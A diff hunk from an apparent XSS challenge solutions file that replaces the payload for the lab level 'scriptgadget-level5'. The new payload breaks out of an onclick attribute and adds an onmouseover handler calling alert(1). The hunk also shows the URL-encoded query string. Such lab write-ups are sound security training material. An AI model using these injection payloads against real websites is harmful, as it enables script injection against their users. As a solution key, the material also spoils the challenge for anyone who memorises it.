@@ -32,10 +32,10 @@ Reflections inside `<script>` JS literals or event-handler attrs; closing the sc
 
 ### scriptgadget-level5
 
-`/scriptgadget/level5/?query=')%3Balert(1)%3B//`
+`/scriptgadget/level5/?query=')%22%20onmouseover=%22alert(1)//`
 
-- payload: `');alert(1);//`
-- context: inside `onclick="handle('...')"`; angle brackets stripped, break out of JS string
+- payload: `')" onmouseover="alert(1)//`
+- context: `handle` is undefined, so break out of the handler attribute and add a new one
 
 ### scriptgadget-level6
 
